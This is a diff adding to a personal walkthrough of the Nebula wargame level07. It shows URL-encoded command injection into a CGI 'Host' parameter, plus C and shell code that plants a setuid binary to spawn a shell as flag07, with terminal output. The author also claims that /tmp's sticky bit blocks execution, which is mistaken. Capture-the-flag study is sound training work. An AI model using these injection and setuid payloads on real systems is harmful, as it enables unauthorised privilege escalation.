@@ -92,7 +92,70 @@ http://192.168.10.133:7007/index.cgi?Host=localhost%3B%2Fbin%2Fbash
 ** Special characters used as its original meaning with Browserd should not be encoded. Above example, ? is used as its original special
 meaning which is "separating query string"
 
+b. exploit program created under /tmp won't work as expected. I think this is something relevant to /tmp directory sticky bit property
+where only owner or group of a file can delete, rename, and also execute. The fix was to simply place the exploit under /home/flag07
+- When I placed exploit program under tmp, it didn't work.
+level07@nebula:/tmp$ ls -al
+total 24
+...
+-rwsr-sr-x 1 flag07  flag07  7198 2019-02-10 03:31 exploit
+....
+
+level07@nebula:/tmp$ ./exploit
+uid=1008(level07) gid=1008(level07) groups=1008(level07)
+level07@nebula:/tmp$ id
+uid=1008(level07) gid=1008(level07) groups=1008(level07)
 
 
-Sol.
-a. 
+
+Sol. - Plan: As we did in level03, I am going to create a c-code setting setuid and running calling process's(flag07) /bin/bash.
+Then create a shell script which compiles the c-code and then places the compiled program under /home/flag07
+a. C-code (/tmp/a.c)
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+
+int main()
+{
+        setresuid(992, 992, 992);  <== flag07's uid.
+        system("id");
+        system("/bin/bash");
+        return 0;
+}
+
+b. shell script (/tmp/a.sh)
+#!/bin/bash
+
+gcc /tmp/a.c -o /home/flag07/exploit
+chmod +s /home/flag07/exploit
+
+c. From the browser, send a command executing /tmp/a.sh
+http://192.168.10.133:7007/index.cgi?Host=localhost%3B%2Ftmp%2Fa.sh
+
+d. Go to /home/flag07 and run exploit
+level07@nebula:/home/flag07$ ls -al
+total 18
+drwxr-x--- 1 flag07 level07   60 2019-02-10 04:13 .
+drwxr-xr-x 1 root   root      80 2012-08-27 07:18 ..
+-rw-r--r-- 1 flag07 flag07   220 2011-05-18 02:54 .bash_logout
+-rw-r--r-- 1 flag07 flag07  3353 2011-05-18 02:54 .bashrc
+-rwsr-sr-x 1 flag07 flag07  7198 2019-02-10 04:13 exploit
+-rwxr-xr-x 1 root   root     368 2011-11-20 21:22 index.cgi
+-rw-r--r-- 1 flag07 flag07   675 2011-05-18 02:54 .profile
+-rw-r--r-- 1 root   root    3719 2011-11-20 21:22 thttpd.conf
+
+level07@nebula:/home/flag07$ ./exploit
+uid=992(flag07) gid=1008(level07) egid=992(flag07) groups=992(flag07),1008(level07)
+bash-4.2$ id
+uid=992(flag07) gid=1008(level07) groups=992(flag07),1008(level07)
+
+bash-4.2$ getflag
+You have successfully executed getflag on a target account
+bash-4.2$
+
+
+
+Reference:
+Setuid, setgid, sticky bit - https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits
+Browser sepcial character encoding - https://www.lifewire.com/encoding-urls-3467463
+
